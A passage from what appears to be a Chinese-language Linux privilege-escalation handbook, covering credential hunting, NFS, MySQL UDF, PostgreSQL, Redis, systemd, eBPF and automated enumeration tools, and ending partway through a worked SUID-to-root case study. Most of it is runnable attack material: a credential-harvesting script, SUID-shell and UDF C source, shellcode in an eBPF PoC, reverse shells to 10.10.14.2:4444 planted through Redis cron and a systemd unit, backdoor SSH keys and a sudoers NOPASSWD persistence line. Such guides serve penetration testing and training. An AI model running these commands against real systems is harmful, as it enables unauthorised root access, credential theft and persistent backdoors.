find / -name "application.properties" 2>/dev/null | xargs grep -i "password\|username" 2>/dev/null

# === Web 服务器配置 ===
cat /etc/apache2/sites-enabled/* 2>/dev/null | grep -i "DocumentRoot\|ServerName"
cat /etc/nginx/sites-enabled/* 2>/dev/null | grep -i "root\|server_name"
cat /etc/nginx/nginx.conf 2>/dev/null

# === 系统配置中的凭据 ===
cat /etc/fstab 2>/dev/null | grep -i "password\|credential"
cat /etc/auto.master 2>/dev/null
cat /etc/exports 2>/dev/null

# === 邮件服务器配置 ===
cat /etc/postfix/main.cf 2>/dev/null | grep -i "password\|sasl"
cat /etc/dovecot/dovecot.conf 2>/dev/null | grep -i "password"

# === 数据库连接字符串 ===
grep -rni "jdbc:" /opt /var/www /etc 2>/dev/null
grep -rni "mongodb://" /opt /var/www /etc 2>/dev/null
grep -rni "redis://" /opt /var/www /etc 2>/dev/null
grep -rni "postgresql://" /opt /var/www /etc 2>/dev/null
grep -rni "mysql://" /opt /var/www /etc 2>/dev/null
```

### 9.3 SSH 密钥挖掘

```bash
# === SSH 私钥 ===
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
find / -name "*.pem" -o -name "*.key" -o -name "*.ppk" 2>/dev/null | head -20

# === 检查私钥权限 ===
find / -name "id_rsa" -perm 600 2>/dev/null  # 正确权限的私钥
find / -name "id_rsa" ! -perm 600 2>/dev/null # 权限过宽的私钥

# === authorized_keys ===
find / -name "authorized_keys" 2>/dev/null | xargs cat 2>/dev/null
# 如果可写 authorized_keys，写入自己的公钥
echo "ssh-rsa AAAAB3NzaC1yc2EAAA..." >> /root/.ssh/authorized_keys

# === 检查 SSH Agent ===
echo $SSH_AUTH_SOCK
# 如果 SSH agent 正在运行，可窃取已加载的密钥
ssh-add -l 2>/dev/null

# === known_hosts 分析 ===
cat ~/.ssh/known_hosts 2>/dev/null
cat /root/.ssh/known_hosts 2>/dev/null
# 揭示目标连接过的主机，内网横向参考
```

### 9.4 .git 泄露与源代码审计

```bash
# === .git 目录泄露 ===
find / -name ".git" -type d 2>/dev/null
find /var/www -name ".git" -type d 2>/dev/null

# === 利用 .git 泄露 ===
# 如果找到 .git 目录
cd /var/www/html/.git
git log --oneline                          # 查看提交历史
git show <commit_hash>                     # 查看某次提交的完整内容
git diff HEAD~1                            # 查看最近一次修改的内容
git grep -i "password\|secret\|token\|api" # 搜索敏感信息

# === 备份文件 ===
find / -name "*.bak" 2>/dev/null
find / -name "*.backup" 2>/dev/null
find / -name "*.old" 2>/dev/null
find / -name "*.orig" 2>/dev/null
find / -name "*.swp" 2>/dev/null           # vim 交换文件
find / -name "*.swo" 2>/dev/null
find / -name "*~" 2>/dev/null              # 备份文件

# === 源代码中的硬编码凭据 ===
grep -rni "password\s*=" /var/www /opt --include="*.php" --include="*.py" 2>/dev/null | head -20
grep -rni "DB_PASSWORD\|DATABASE_PASSWORD\|SECRET_KEY\|API_KEY" /var/www /opt 2>/dev/null | head -20
grep -rni "mysql_connect\|mysqli_connect\|pg_connect\|sqlite_open" /var/www 2>/dev/null | head -20
```

### 9.5 环境变量与进程内存

```bash
# === 当前进程环境变量 ===
env
cat /proc/self/environ | tr '\0' '\n'
cat /proc/1/environ | tr '\0' '\n'        # PID 1 的环境变量

# === 其他进程环境变量 ===
# 需要 root 权限或 ptrace 能力
for pid in $(ps aux | awk '{print $2}' | head -20); do
  echo "=== PID $pid ==="
  cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -i "pass\|secret\|token\|key\|cred"
done

# === 进程内存中的凭据 ===
# 从内存中提取字符串（需要 root 或 ptrace 能力）
gdb -p <pid> -batch -ex "info proc mappings" -ex "quit"
# 或使用 /proc/pid/mem
strings /proc/<pid>/mem 2>/dev/null | grep -i "password\|secret" | head -20

# === /proc 文件系统信息泄露 ===
cat /proc/version
cat /proc/cmdline                           # 内核启动参数（可能含凭据）
cat /proc/mounts                            # 挂载点
cat /proc/net/tcp                           # TCP 连接信息
cat /proc/net/udp                           # UDP 连接信息
```

### 9.6 日志文件分析

```bash
# === 系统日志 ===
cat /var/log/auth.log 2>/dev/null | grep -i "password\|fail\|accept" | tail -20
cat /var/log/secure 2>/dev/null | grep -i "password\|fail\|accept" | tail -20
cat /var/log/syslog 2>/dev/null | grep -i "password\|fail" | tail -20

# === 应用日志 ===
find /var/log -name "*.log" -exec grep -li "password\|secret\|token" {} \; 2>/dev/null
cat /var/log/apache2/access.log 2>/dev/null | tail -20
cat /var/log/nginx/access.log 2>/dev/null | tail -20

# === 邮件日志 ===
cat /var/log/mail.log 2>/dev/null | tail -20
cat /var/log/maillog 2>/dev/null | tail -20

# === 安装日志 ===
cat /var/log/installer/syslog 2>/dev/null | grep -i "password" | head -10
cat /var/log/bootstrap.log 2>/dev/null | grep -i "password" | head -10
```

### 9.7 一键凭据收集脚本

```bash
cat > /tmp/creds_hunter.sh << 'EOF'
#!/bin/bash
OUT="/tmp/creds_output.txt"
echo "=== CREDENTIALS HUNTING REPORT ===" > $OUT
echo "Date: $(date)" >> $OUT
echo "" >> $OUT

# SSH Keys
echo "[SSH KEYS]" >> $OUT
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null >> $OUT

# Config files with passwords
echo -e "\n[CONFIG FILES]" >> $OUT
find / -name "*.env" -o -name "wp-config.php" -o -name "database.yml" 2>/dev/null >> $OUT

# Password patterns
echo -e "\n[PASSWORD PATTERNS]" >> $OUT
grep -rni "password\s*=" /var/www /opt /etc 2>/dev/null | grep -v ".css\|.js\|.svg" | head -30 >> $OUT

# History files
echo -e "\n[HISTORY FILES]" >> $OUT
find /home /root -name ".bash_history" -o -name ".zsh_history" -o -name ".mysql_history" 2>/dev/null >> $OUT

# Git repos
echo -e "\n[GIT REPOS]" >> $OUT
find / -name ".git" -type d 2>/dev/null >> $OUT

echo -e "\n[+] Report saved to $OUT"
EOF
chmod +x /tmp/creds_hunter.sh
/tmp/creds_hunter.sh
```

---

## 10. NFS / SMB / 网络服务提权

网络服务的配置缺陷是提权的重要入口，特别是在内网环境中。NFS no_root_squash、MySQL UDF、PostgreSQL RCE 都是经典的高收益提权路径。

### 10.1 NFS no_root_squash 提权

```bash
# === NFS 侦察 ===
showmount -e <target_ip> 2>/dev/null
cat /etc/exports 2>/dev/null
# 检查 no_root_squash 配置
# /exports *(rw,no_root_squash)  → 高危

# === 利用 no_root_squash ===
# 1. 在攻击机上挂载 NFS 共享
mkdir -p /tmp/nfs_mount
mount -t nfs <target_ip>:/exports /tmp/nfs_mount

# 2. 创建 SUID 二进制到挂载点
cat > /tmp/suid_shell.c << 'EOF'
#include <unistd.h>
#include <stdlib.h>
int main() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF
gcc -o /tmp/nfs_mount/suid_shell /tmp/suid_shell.c
chown root:root /tmp/nfs_mount/suid_shell
chmod u+s /tmp/nfs_mount/suid_shell

# 3. 在目标机上执行
/exports/suid_shell

# === 利用 no_root_squash 写 SSH 密钥 ===
# 如果挂载的是用户家目录
mkdir -p /tmp/nfs_mount/.ssh
ssh-keygen -t rsa -f /tmp/id_rsa -N ""
cat /tmp/id_rsa.pub >> /tmp/nfs_mount/.ssh/authorized_keys
chmod 600 /tmp/nfs_mount/.ssh/authorized_keys
ssh -i /tmp/id_rsa root@<target_ip>
```

### 10.2 MySQL UDF 提权

```bash
# === 前置条件 ===
# 1. MySQL 以 root 用户运行
# 2. 拥有 MySQL root 密码或可登录
# 3. secure_file_priv 允许写入插件目录

# === 1. 确认 MySQL 运行用户 ===
ps aux | grep mysql
# mysql   1234  ... /usr/sbin/mysqld
# 如果 mysql 以 root 运行，则 UDF 提权后获得 root

# === 2. 确认插件目录 ===
mysql -u root -p -e "SHOW VARIABLES LIKE 'plugin_dir';"
# 或
mysql -u root -p -e "SELECT @@plugin_dir;"

# === 3. 确认 secure_file_priv ===
mysql -u root -p -e "SHOW VARIABLES LIKE 'secure_file_priv';"
# 如果为空或指向可写目录，OK

# === 4. 编译 UDF 库 ===
# 在攻击机上
cat > /tmp/raptor_udf2.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
enum Item_result {STRING_RESULT=0, REAL_RESULT, INT_RESULT, ROW_RESULT};
typedef struct st_udf_args {
    unsigned int arg_count;
    enum Item_result *arg_type;
    char **args;
    unsigned long *lengths;
    char *maybe_null;
    char **attributes;
    unsigned long *attribute_lengths;
    void *extension;
} UDF_ARGS;
typedef struct st_udf_init {
    char maybe_null;
    unsigned int decimals;
    unsigned long max_length;
    char *ptr;
    char const_item;
    void *extension;
} UDF_INIT;
int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
    if (args->arg_count != 1) return 0;
    system(args->args[0]);
    return 0;
}
char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message) { return 0; }
EOF
gcc -shared -fPIC -o /tmp/raptor_udf2.so /tmp/raptor_udf2.c

# === 5. 上传并加载 UDF ===
# 方法 A：通过 MySQL 写入（需要 secure_file_priv 允许）
# 将 .so 文件转为 hex
xxd -p /tmp/raptor_udf2.so | tr -d '\n' > /tmp/raptor_udf2.hex
# 在 MySQL 中
mysql -u root -p -e "
SELECT 0x$(cat /tmp/raptor_udf2.hex) INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
SELECT do_system('chmod u+s /bin/bash');
"

# 方法 B：通过文件上传
# 如果已获得文件写入权限
cp /tmp/raptor_udf2.so /usr/lib/mysql/plugin/
mysql -u root -p -e "
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
SELECT do_system('cp /bin/bash /tmp/bash && chmod u+s /tmp/bash');
"

# === 6. 执行提权 ===
/tmp/bash -p
```

### 10.3 PostgreSQL RCE / 提权

```bash
# === PostgreSQL 本地提权 ===
# 需要 PostgreSQL 数据库访问权限

# 1. 创建执行系统命令的函数
psql -U postgres -c "
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('chmod u+s /bin/bash');
"

# 2. PostgreSQL 大对象导出（写入文件）
psql -U postgres -c "
SELECT lo_create(99999);
SELECT lo_put(99999, 0, decode('$(base64 -w0 /tmp/shell.elf)', 'base64'));
SELECT lo_export(99999, '/tmp/shell');
"
# 然后执行 /tmp/shell

# 3. COPY 命令写文件（需要 superuser）
psql -U postgres -c "
COPY (SELECT '#!/bin/bash\ncp /bin/bash /tmp/bash && chmod u+s /tmp/bash') TO '/tmp/pwn.sh';
"
# 然后 chmod +x 并执行

# 4. PostgreSQL 配置注入（CVE-2019-9193）
# 影响 PostgreSQL 9.3 - 11.2
# 需要 superuser
psql -U postgres -c "
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'chmod u+s /bin/bash';
SELECT * FROM cmd_exec;
"
```

### 10.4 Apache / PHP-FPM 提权

```bash
# === Apache 以 root 运行时的提权 ===
# 检查 Apache 运行用户
ps aux | grep apache
# root  1234  ... /usr/sbin/apache2 -k start
# 如果 Apache 以 root 运行（不当配置）

# 1. 通过 CGI 脚本执行命令
# 如果已获得 Web 目录写入权限
cat > /var/www/html/shell.cgi << 'EOF'
#!/bin/bash
echo "Content-Type: text/plain"
echo ""
cp /bin/bash /tmp/bash
chmod u+s /tmp/bash
echo "SUID bash created at /tmp/bash"
EOF
chmod +x /var/www/html/shell.cgi
curl http://localhost/shell.cgi

# === PHP-FPM 提权 ===
# 如果 PHP-FPM 以 root 运行（不当配置）
# 检查 PHP-FPM 配置
cat /etc/php/*/fpm/pool.d/www.conf | grep -E "user|group|listen"

# 1. 如果 PHP-FPM 监听 Unix socket 且可访问
ls -la /run/php/php*-fpm.sock
# 如果 socket 可写，可注入恶意请求

# 2. PHP-FPM SSRF → RCE (CVE-2019-11043)
# 利用 fastcgi 协议与 PHP-FPM 通信
```

### 10.5 其他网络服务提权

```bash
# === Redis 提权 ===
# 如果 Redis 以 root 运行且无密码或已知密码
redis-cli -h 127.0.0.1
# 写入 SSH 密钥
redis-cli CONFIG SET dir /root/.ssh
redis-cli CONFIG SET dbfilename authorized_keys
redis-cli SET key "\n\nssh-rsa AAAAB3NzaC1yc2EAA...\n\n"
redis-cli SAVE
# 写入 crontab
redis-cli CONFIG SET dir /var/spool/cron/crontabs
redis-cli CONFIG SET dbfilename root
redis-cli SET key "\n\n* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'\n\n"
redis-cli SAVE

# === MongoDB 提权 ===
# MongoDB 3.6+ 默认监听 127.0.0.1
# 如果 MongoDB 以 root 运行且有 admin 权限
mongo --eval "db.adminCommand({setParameter:1, internalQueryExecMaxBlockingSortBytes:999999999})"

# === Elasticsearch 提权 ===
# Elasticsearch 不应以 root 运行，但如果配置不当
curl -XPOST 'http://127.0.0.1:9200/_search?pretty' -d '{"query":{"match_all":{}}}'

# === Jenkins 提权 ===
# 如果 Jenkins 以 root 运行
# 通过 Groovy 脚本控制台执行命令
curl -X POST 'http://127.0.0.1:8080/scriptText' \
  --data-urlencode 'script=println "chmod u+s /bin/bash".execute().text'
```

---

## 11. eBPF 提权 — 2026 新技术前沿

eBPF (Extended Berkeley Packet Filter) 是 Linux 内核中强大的虚拟机技术，允许在无需修改内核源码或加载内核模块的情况下，在沙箱中运行用户提供的程序。2025-2026 年，eBPF 成为新的提权攻击面。

### 11.1 eBPF 基础与攻击面

```bash
# === 检查 eBPF 可用性 ===
cat /proc/sys/kernel/unprivileged_bpf_disabled
# 0 = 非特权用户可加载 eBPF 程序（高危）
# 1 = 非特权用户被禁用（但 CAP_BPF 或 CAP_SYS_ADMIN 仍可）
# 2 = 完全禁用（需重启）

# 检查是否已加载 eBPF 程序
bpftool prog list 2>/dev/null
ls -la /sys/fs/bpf/ 2>/dev/null

# 检查 eBPF 相关内核配置
cat /boot/config-$(uname -r) 2>/dev/null | grep -E "CONFIG_BPF|CONFIG_BPF_JIT"
```

### 11.2 eBPF JIT 喷射 (JIT Spraying)

```bash
# eBPF JIT 编译器将 eBPF 字节码编译为本地机器码
# JIT 喷射攻击：构造特殊的 eBPF 程序，使 JIT 编译器生成包含 shellcode 的代码

# 前置条件：unprivileged_bpf_disabled = 0
cat > /tmp/jit_spray.py << 'EOF'
#!/usr/bin/env python3
"""
eBPF JIT Spraying PoC
利用 eBPF JIT 编译器生成包含 shellcode 的机器码
"""
import ctypes
import os
import struct

# 加载 libbpf
libc = ctypes.CDLL("libc.so.6")

# BPF 系统调用
BPF_PROG_LOAD = 5
BPF_MAP_CREATE = 0

# BPF 指令结构
def bpf_insn(code, dst, src, off, imm):
    return struct.pack('<BBHIi', code, dst, src, off, imm)

# 构造包含 shellcode 的 eBPF 指令序列
# 利用 64 位立即数加载指令编码 shellcode
def build_jit_shellcode():
    # shellcode: execve("/bin/sh", NULL, NULL)
    # 将 shellcode 编码为 eBPF 64 位立即数
    shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
    # 填充到 8 字节对齐
    while len(shellcode) % 8 != 0:
        shellcode += b"\x90"
    
    instructions = []
    # 将 shellcode 按 8 字节分组，编码为 BPF_LD_IMM64 指令
    for i in range(0, len(shellcode), 8):
        chunk = shellcode[i:i+8]
        imm_lo = struct.unpack('<I', chunk[:4])[0]
        imm_hi = struct.unpack('<I', chunk[4:])[0]
        # BPF_LD | BPF_DW | BPF_IMM (0x18)
        instructions.append(bpf_insn(0x18, 0, 0, 0, imm_lo))
        instructions.append(bpf_insn(0x00, 0, 0, 0, imm_hi))
    
    # 添加退出指令
    instructions.append(bpf_insn(0x95, 0, 0, 0, 0))
    return b''.join(instructions)

# 加载 eBPF 程序
prog = build_jit_shellcode()
# 通过 syscall 加载...
# 完整 PoC 需使用 libbpf 的 bpf_prog_load
EOF
python3 /tmp/jit_spray.py
```

### 11.3 eBPF Verifier 绕过

```bash
# eBPF verifier 是内核中的静态分析器，确保 eBPF 程序安全
# 历史上 verifier 漏洞多次导致提权（CVE-2020-8835, CVE-2021-3490 等）

# 2025-2026 年 eBPF verifier 关注点：
# 1. 寄存器值域跟踪精度缺陷
# 2. 指针运算校验绕过
# 3. 分支修剪逻辑漏洞
# 4. 32 位与 64 位边界检查不一致
# 5. map 操作后状态预测错误

# 检查 verifier 日志级别
cat /proc/sys/kernel/unprivileged_bpf_disabled
dmesg | grep -i "bpf.*verifier"

# 利用框架：CVE-2020-8835 风格
# 构造能通过 verifier 但实际执行时越界的 eBPF 程序
```

### 11.4 eBPF Map 权限提升

```bash
# eBPF maps 是内核与用户空间共享数据的结构
# 如果 map 权限设置不当，可被其他进程读写

# 1. 检查 /sys/fs/bpf 中的 map 文件
ls -la /sys/fs/bpf/ 2>/dev/null
# 如果某些 map 全局可读可写，可注入数据

# 2. 如果有 CAP_BPF 或 CAP_SYS_ADMIN
# 可创建自己的 bpf map 并 pin 到文件系统
bpftool map create /sys/fs/bpf/evil_map type array key 4 value 4 entries 1

# 3. 利用 bpf 程序挂钩内核函数
# 通过 bpf_override_return 修改内核函数返回值
# 需要 CAP_SYS_ADMIN 或 CAP_BPF + 特定内核版本
```

### 11.5 eBPF 相关 CVE

```bash
# CVE-2020-8835: bpf verifier 越界读写
# 影响：Linux 内核 5.5+ (bpf 32-bit 边界检查)
# PoC: https://github.com/dayzerodSec/CVE-2020-8835

# CVE-2021-3490: bpf 指针运算未正确检查
# 影响：Linux 内核 5.7+
# PoC: https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490

# CVE-2022-23222: bpf verifier 本地权限提升
# 影响：Linux 内核 5.8+

# CVE-2023-2163: bpf verifier 逻辑缺陷
# 影响：Linux 内核 5.19+

# 检测 eBPF 相关内核版本
uname -r
cat /proc/sys/kernel/unprivileged_bpf_disabled

# 使用 eBPF 进行进程注入（需要 CAP_SYS_ADMIN）
# 通过 bpf_probe_write_user 写入用户空间内存
# 修改 root 进程的代码段注入 shellcode
```

### 11.6 eBPF 防御与检测

```bash
# 加固 eBPF
# 1. 禁用非特权 eBPF
echo 1 > /proc/sys/kernel/unprivileged_bpf_disabled
# 或 sysctl -w kernel.unprivileged_bpf_disabled=1

# 2. 审计 eBPF 程序加载
# 通过 auditd 监控 bpf 系统调用
auditctl -a always,exit -F arch=b64 -S bpf -k bpf_activity

# 3. 监控 /sys/fs/bpf 目录
inotifywait -m /sys/fs/bpf/

# 4. 使用 bpftool 列举已加载程序
bpftool prog list
bpftool prog dump xlated id <prog_id>
```

---

## 12. Systemd 服务滥用 — 服务单元劫持与 Timer 触发

Systemd 是现代 Linux 系统的初始化系统和服务管理器。当低权限用户可修改 service 文件、timer 文件，或利用 systemd 特性时，即可实现提权。

### 12.1 服务单元文件劫持

```bash
# === 查找可写的 service 文件 ===
find /etc/systemd/system -writable -type f 2>/dev/null
find /usr/lib/systemd/system -writable -type f 2>/dev/null
find /run/systemd/system -writable -type f 2>/dev/null

# Systemd 服务文件搜索优先级：
# 1. /etc/systemd/system/ (最高优先级)
# 2. /run/systemd/system/
# 3. /usr/lib/systemd/system/ (默认)

# === 如果某个 service 文件可写 ===
# 修改 ExecStart 为恶意命令
cat > /etc/systemd/system/vulnerable.service << 'EOF'
[Unit]
Description=Vulnerable Service
[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod u+s /bin/bash"
User=root
Group=root
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl start vulnerable.service

# === 如果 service 目录可写 ===
# 创建新的 service 文件
cat > /etc/systemd/system/evil.service << 'EOF'
[Unit]
Description=Evil Service
[Service]
Type=oneshot
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1"
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable --now evil.service
```

### 12.2 Systemd Timer 劫持

```bash
# === 列出所有 timer ===
systemctl list-timers --all --no-pager

# === 检查 timer 文件 ===
# 找到对应的 timer 和 service
systemctl cat <timer_name>.timer
systemctl cat <timer_name>.service

# === 如果 timer 对应的 service 文件可写 ===
# 例如：logrotate.timer → logrotate.service
cat > /etc/systemd/system/logrotate.service << 'EOF'
[Unit]
Description=Logrotate
[Service]
Type=oneshot
ExecStart=/bin/bash -c "cp /bin/bash /tmp/bash && chmod u+s /tmp/bash"
User=root
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
# 等待 timer 触发或手动触发
systemctl start logrotate.service
```

### 12.3 低权限服务修改

```bash
# === 检查当前用户是否有管理某些服务的权限 ===
# Systemd 支持 PolicyKit 授权，低权限用户可能被授权管理特定服务
systemctl status <service> 2>&1 | grep "polkit"
# 使用 pkexec 尝试管理服务
pkexec systemctl start <service>

# === 检查 /etc/sudoers 中的 systemctl 权限 ===
sudo -l | grep systemctl
# 如果允许 sudo systemctl <service>，可利用

# 利用 systemctl 提权
# 1. 如果 sudo 允许 systemctl restart <service>
sudo systemctl edit --full <service>
# 修改 ExecStart 为恶意命令，保存后重启

# 2. 如果 sudo 允许 systemctl <any>
sudo systemctl --no-block -q /bin/bash -c "chmod u+s /bin/bash"
```

### 12.4 Systemd 环境变量注入

```bash
# systemd service 支持 Environment/EnvironmentFile 指令
# 如果 service 文件可写，可注入环境变量

# 1. 注入 LD_PRELOAD
cat > /etc/systemd/system/vulnerable.service << 'EOF'
[Unit]
Description=Vulnerable Service
[Service]
Type=oneshot
Environment="LD_PRELOAD=/tmp/evil.so"
ExecStart=/usr/bin/some_binary
User=root
[Install]
WantedBy=multi-user.target
EOF

# 2. 注入 PATH
cat > /etc/systemd/system/vulnerable.service << 'EOF'
[Service]
Environment="PATH=/tmp:/usr/bin:/bin"
ExecStart=some_binary   # 将在 /tmp 中查找 some_binary
User=root
EOF
# 然后在 /tmp 中创建恶意 some_binary
```

### 12.5 Systemd 用户服务滥用

```bash
# systemd 支持用户级服务（--user）
# 用户服务中的配置缺陷可能被滥用

# 1. 列出用户服务
systemctl --user list-units

# 2. 检查用户服务目录
ls -la ~/.config/systemd/user/
ls -la /etc/systemd/user/

# 3. 如果用户服务以 root 运行（不当配置）
# 创建恶意用户服务
mkdir -p ~/.config/systemd/user/
cat > ~/.config/systemd/user/evil.service << 'EOF'
[Service]
ExecStart=/bin/bash -c "chmod u+s /bin/bash"
EOF
systemctl --user daemon-reload
systemctl --user start evil.service
```

### 12.6 Systemd 提权检测脚本

```bash
cat > /tmp/systemd_check.sh << 'EOF'
#!/bin/bash
echo "=== Systemd Privilege Escalation Check ==="

# 1. 可写 service 文件
echo -e "\n[1] Writable service files:"
find /etc/systemd/system /usr/lib/systemd/system -writable -type f 2>/dev/null

# 2. 可写 service 目录
echo -e "\n[2] Writable service directories:"
find /etc/systemd/system /usr/lib/systemd/system -writable -type d 2>/dev/null

# 3. sudo systemctl 权限
echo -e "\n[3] Sudo systemctl permissions:"
sudo -l 2>/dev/null | grep -i systemctl

# 4. 当前用户可管理的服务
echo -e "\n[4] User-manageable services:"
systemctl list-units --type=service --state=running 2>/dev/null | head -20

# 5. PKexec 服务管理
echo -e "\n[5] PKexec service management:"
pkexec systemctl status sshd 2>/dev/null && echo "  [!] Can manage services via pkexec"

# 6. 检查 timer
echo -e "\n[6] Systemd timers:"
systemctl list-timers --all 2>/dev/null | head -10
EOF
chmod +x /tmp/systemd_check.sh
/tmp/systemd_check.sh
```

---

## 13. 自动化提权工具链 — 从手工到自动化

自动化工具是 Linux 提权的加速器。本节覆盖从 LinPEAS 到高级利用框架的完整工具链。

### 13.1 LinPEAS — 最全面的枚举工具

```bash
# LinPEAS (PEASS-ng) — Linux Privilege Escalation Awesome Script
# GitHub: https://github.com/peass-ng/PEASS-ng

# 下载并执行（内存执行）
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 保存输出
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a > linpeas_output.txt 2>&1

# 关键参数
./linpeas.sh -a          # 所有检查（包括暴力破解）
./linpeas.sh -s          # 超级快速模式
./linpeas.sh -q          # 安静模式（减少误报）
./linpeas.sh -o <file>   # 仅输出到文件

# 输出分析重点
# 红色/黄色标记 = 高优先级（99% 提权可能）
# - 可写 /etc/passwd
# - 可写 /etc/sudoers
# - SUID 二进制（特别是 GTFOBins 列表中的）
# - 内核漏洞利用建议
```

### 13.2 LinEnum — 轻量级枚举

```bash
# LinEnum — 轻量级 Linux 枚举脚本
# GitHub: https://github.com/rebootuser/LinEnum

# 下载
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh

# 执行
./LinEnum.sh -t -r report -e /tmp/ -k keyword

# 参数
# -t: 彻底测试
# -r: 报告名称
# -e: 额外导出目录
# -k: 关键字搜索
```

### 13.3 pspy — 无 root 进程监控

```bash
# pspy — 无需 root 权限监控进程执行
# GitHub: https://github.com/DominicBreuker/pspy

# 下载（根据架构选择）
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64    # 64-bit
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32    # 32-bit

# 执行
chmod +x pspy64
./pspy64

# 关键参数
./pspy64 -p              # 显示命令参数
./pspy64 -f              # 显示文件系统事件
./pspy64 -i 1000         # 毫秒扫描间隔
./pspy64 -c              # 彩色输出

# 典型用法：监控 cron 任务
./pspy64 -pf | grep -i "cron\|sh\|bash\|python\|perl\|php"
```

### 13.4 linux-exploit-suggester / linux-exploit-suggester-2

```bash
# linux-exploit-suggester — 内核漏洞建议
# 原始版本
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# linux-exploit-suggester-2 (Perl 版本，更全面)
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
perl linux-exploit-suggester-2.pl
# 或
chmod +x linux-exploit-suggester-2.pl
./linux-exploit-suggester-2.pl

# 输出示例
# [CVE-2021-4034] PwnKit
# [CVE-2022-0847] DirtyPipe
# ...
```

### 13.5 traitor — 自动化提权利用

```bash
# traitor — 自动检测并利用 Linux 提权漏洞
# GitHub: https://github.com/liamg/traitor

# 下载二进制
wget https://github.com/liamg/traitor/releases/latest/download/traitor-amd64 -O traitor
chmod +x traitor

# 执行（自动检测并利用）
./traitor -p
# -p 参数：如果找到利用方式，询问是否执行

# 交互模式
./traitor
# 列出所有可能的提权路径，选择执行
```

### 13.6 linux-smart-enumeration (lse.sh)

```bash
# lse.sh — 智能 Linux 枚举
# GitHub: https://github.com/diego-treitos/linux-smart-enumeration

# 下载
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
chmod +x lse.sh

# 执行
./lse.sh -l1              # 级别 1（快速）
./lse.sh -l2              # 级别 2（全面，推荐）

# 输出格式
# [!] 红色 = 高概率提权
# [*] 黄色 = 可能需要进一步分析
# [+] 绿色 = 信息收集
```

### 13.7 综合工具链 SOP

```bash
# Linux 提权标准操作流程 (SOP)
# 步骤 1：快速手动枚举（1 分钟）
id && sudo -l 2>/dev/null && uname -a && find / -perm -4000 -type f 2>/dev/null | grep -v snap | head -20

# 步骤 2：LinPEAS 全面扫描（3-5 分钟）
# 上传并执行 LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh > /tmp/linpeas.txt 2>&1

# 步骤 3：内核漏洞检测
# 上传 linux-exploit-suggester
perl linux-exploit-suggester-2.pl

# 步骤 4：进程监控（如怀疑 cron 提权）
# 上传 pspy64
./pspy64 -pf > /tmp/pspy_output.txt 2>&1 &
# 等 5-10 分钟观察 cron 任务

# 步骤 5：手动深入分析（根据前几步结果）
# - SUID 二进制 → GTFOBins
# - Sudo 权限 → GTFOBins
# - 内核漏洞 → 匹配 PoC
# - 容器环境 → 容器逃逸
# - 凭据 → SSH 密钥利用

# 步骤 6：自动化利用
# traitor -p
```

---

## 14. 实战案例 — 完整提权链

本节展示从信息收集到获得 root 权限的完整实战案例，涵盖 SUID、SUDO、内核漏洞、容器逃逸等多个攻击面。

### 14.1 案例一：Web 应用 → SUID → root

```
场景：通过 Web 漏洞获得 www-data 用户 shell
目标：Ubuntu 20.04 LTS，内核 5.4.0
```

```bash
# === 阶段 1：信息收集 ===
whoami
# www-data

id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

uname -a
# Linux web01 5.4.0-150-generic #167-Ubuntu SMP ... x86_64 GNU/Linux

sudo -l 2>/dev/null
# (无 sudo 权限)

# === 阶段 2：SUID 扫描 ===
find / -perm -4000 -type f 2>/dev/null | grep -vE "/snap/|/proc/"
# /usr/bin/find
# /usr/bin/pkexec
# /usr/bin/python3.8

# 检查这些 SUID 二进制
ls -la /usr/bin/find /usr/bin/pkexec /usr/bin/python3.8
# -rwsr-xr-x 1 root root /usr/bin/find
# -rwsr-xr-x 1 root root /usr/bin/pkexec
# -rwsr-xr-x 1 root root /usr/bin/python3.8

# === 阶段 3：利用 SUID find ===
# GTFOBins: find 的 -exec 可执行任意命令
find . -exec /bin/bash -p \; -quit
# 获得 root shell!

# 验证
id
# uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)

# 持久化
cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
echo "www-data ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

# === 阶段 4：横向移动准备 ===
